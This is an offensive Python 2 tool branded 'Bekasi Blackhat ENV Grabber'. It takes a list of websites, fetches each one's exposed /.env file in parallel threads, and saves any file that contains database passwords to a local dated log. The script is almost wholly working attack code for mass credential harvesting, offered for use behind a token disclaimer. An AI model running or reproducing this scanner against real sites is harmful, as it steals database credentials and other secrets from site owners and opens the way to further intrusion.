# -*- coding: utf-8 -*-
from itertools import cycle
import warnings,random,socket
import requests, re, sys, os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from time import time as timer  
import time
import sys, os, re, socket, binascii, time, json, random, threading, Queue, pprint, urlparse, smtplib, telnetlib, os.path, hashlib, string, urllib2, glob, sqlite3, urllib, argparse, marshal, base64, requests
from random import choice
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from platform import system
from Queue import Queue
from time import strftime
from urlparse import urlparse
from urllib2 import urlopen
from multiprocessing.dummy import Pool
year = time.strftime("%y")
month = time.strftime("%m")
day = time.strftime("%d")
live = 0
proxy = ""

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }


def prepare(sites):

    try:
      if 'http' not in sites:
        sites = 'http://'+sites
      else:
        sites = sites

      meki = requests.get(sites+'/.env',headers=Headers,timeout=5)
      if 'DB_PASSWORD=' in meki.text:
        print '[-] '+sites + ' ====> Vuln'
        open('config-'+year+month+day+'.txt', 'a').write("\n---------------Bekasi Blackhat ENV Grabber-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
      else:
        print '[-] '+sites + ' ====> Not Vuln'
    except Exception as e:
        print str(e)



def logo():
    clear = "\x1b[0m"

    x = """\033[1;32;40m
OWNDZ By Bekasi Blackhat

 \033[1;32;40mNot responsible for any illegal
 \033[1;32;40musage of this tool.\033[0;40m

 \033[1;30;40mAuthor   \033[1;40m: \033[1;33;40mFacebook:https://www.facebook.com/sultan.konslet
 \033[1;30;40mLink     \033[1;40m: \033[1;33;40mhttps://github.com/sultankonslet9
 \033[1;30;40mVersion  \033[1;40m: \033[1;33;40m0.1#First Edition V 0.1 beta
"""
    print x
    
logo()

try:
    nam = raw_input("\033[1;33;40mInput Your List : \033[1;47m") #for date
    th = input('Thread : ')
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(prepare, liss)
except Exception as e:
    print str(e)
